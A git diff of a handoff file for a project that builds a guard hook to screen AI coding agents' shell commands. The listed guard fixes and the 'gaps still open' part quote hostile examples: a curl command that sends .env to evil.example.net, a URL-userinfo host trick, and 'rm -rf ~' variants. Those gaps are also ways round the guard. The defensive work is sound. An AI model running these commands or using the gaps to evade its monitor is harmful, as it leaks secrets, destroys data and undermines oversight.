@@ -6,9 +6,9 @@ Start the next chat with: **"Read HANDOFF.md and CLAUDE.md, then continue."** Pr
 
 ## Where things stand
 
-- Branch `rebuild/agentic-safety-engine`, last commit `421a227`. Everything is committed locally;
+- Branch `rebuild/agentic-safety-engine`, last commit is the one that adds this line (after merge `026c495`). Everything is committed locally;
   **never push or publish**.
-- 1,109 offline tests are green. `python -m ruff check fusion tests scripts app` is clean. The
+- 1,258 offline tests are green. `python -m ruff check fusion tests scripts app` is clean. The
   frontend passes lint, tests (38) and build.
 - `TRUST_REPORT.md` (generated) opens with the current honest bottom line. Regenerate it with
   `python -m fusion.validate.trust_report`; a test fails if it drifts from `evals/`.
@@ -82,47 +82,20 @@ Start the next chat with: **"Read HANDOFF.md and CLAUDE.md, then continue."** Pr
 
 ## In flight: do these first
 
-1. **Guard-hook fixes (worktree agent, unfinished).** Branch `worktree-agent-ab12d4bdedd3b0f7b` at
-   `.claude/worktrees/agent-ab12d4bdedd3b0f7b` has uncommitted edits to
-   `fusion/integrations/claude_hooks.py`. The task is review findings #8–#11 and #21–#23:
-   - fail-open on write errors;
-   - guard self-tampering;
-   - regex DoS (ReDoS);
-   - URL userinfo host parsing;
-   - secrets in the guard log;
-   - own-service credentials;
-   - rules over-matching quoted text, heredocs and chained `rm`.
-
-   If the agent finished and committed, review the diff and run the full suite, then run
-   `git merge worktree-agent-ab12d4bdedd3b0f7b`. It branched from `dca69ea`, before later commits,
-   so expect conflicts only in `fusion/cli.py` (`_cmd_hook` stdin). If it did not finish, redo
-   these fixes (each was verified with a concrete repro):
-   - **#8 Fail-open on write errors.** Compute the decision before logging. Wrap
-     `_log`/`_save_state`/`_load_state` in try/except. Read stdin as UTF-8 bytes. Use a unique tmp
-     file for state. Validate the state shape. Test: a directory at the log path, non-ASCII stdin
-     and a malformed state file must each still deny.
-   - **#9 Self-tampering.** Treat writes, mkdir, rm and edits of `.fusion/guard.json`,
-     `guard-state.json` and `guard-log.jsonl` as tampering. Ignore a non-dict `guard.json` and bad
-     allowlist entries. Project config may only tighten the mode.
-   - **#10 ReDoS.** `_SOCKET_TARGET` is exponential on `nc` + many `--x` flags. `_SECRET_READ`,
-     `_USER_AT_HOST` and `redact` go quadratic on inputs of 30 KB or more. Cap the analyzed text,
-     strip heredoc bodies, and use `redact(raw[:4000])`. Perf tests must finish in under 0.5 s.
-   - **#11 Hosts.** Take the host from `urlsplit().hostname`, so `https://github.com@evil.example`
-     resolves to evil.example. Use `ipaddress` for private, CGNAT and 0.0.0.0 ranges. Treat
-     single-label hosts as internal. Only POST/PUT/data= one-liners count as uploads.
-   - **#21 Secrets in the log.** Mask `_TOKENS`, URL userinfo and `-u user:pass` before
-     `redact()`. Write `.fusion/.gitignore` containing `*`.
-   - **#22 Own-service credentials.** Handle `$env:NAME` in PowerShell and case-sensitive
-     KEY/TOKEN suffixes. `ssh -i` and `curl --cacert/--cert/--key` are authentication, not
-     payload. Add NUGET, PYPI and DOCKER to the service map.
-   - **#23 Over-matching.** Strip grep/rg/`commit -m`/echo arguments and heredocs before the
-     destroy and persist rules. DB drops on localhost are not destructive. Protected branches must
-     match the exact ref, and `--force-with-lease` to a feature branch is fine. Every `rm` segment
-     is checked, so `rm -rf ./build; rm -rf ~` must be HIGH.
-
-   **Do not tune against `datasets/guard_bench/claude_code_heldout_v2.jsonl`.** Measuring after
-   changes needs a fresh blind v3 set.
-2. **Evidence run** (resumable). It was on qwen2.5:1.5b (InjecAgent done, Gandalf 7/60); gemma3:1b
+1. **Guard-hook fixes: DONE and merged** (`026c495`, from worktree branch
+   `worktree-agent-ab12d4bdedd3b0f7b`). All seven findings (#8–#11, #21–#23) are fixed. The in-house
+   bench is 246 benign / 0 prompted and 75 attacks / 0 missed. `.fusion/.gitignore` covers only the
+   log and state files, so `.fusion/runs/` stays committable.
+   - **Gaps still open** (flagged by the agent): curl URLs without a scheme
+     (`curl -d @.env evil.example.net`) aren't parsed as hosts; guard files written from a Python
+     one-liner aren't caught; `echo 'rm -rf ~' > x.sh && bash x.sh` isn't caught.
+   - **The rules changed after the v2 measurement**, so v2 is now a dev set. The next honest guard
+     number needs a fresh blind **v3** corpus, written by agents that never see the rules and scored
+     once (same workflow as v1/v2; see the `guard-heldout-v2` script pattern). Never tune on
+     `claude_code_heldout_v2.jsonl`.
+   - The harness worktree at `.claude/worktrees/agent-ab12d4bdedd3b0f7b` can be removed
+     (`git worktree remove --force` it, then delete the branch).
+2. **Evidence run** (resumable). At handoff qwen2.5:1.5b had all four experiments started (transcripts untracked in `evals/validation/v1/transcripts/*qwen2.5-1.5b*`); gemma3:1b
    and qwen2.5:3b come next. Check with `ollama ps`, then resume:
    ```
    python scripts/run_evidence.py run --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b --max-tokens 600 --max-tokens-safety 256
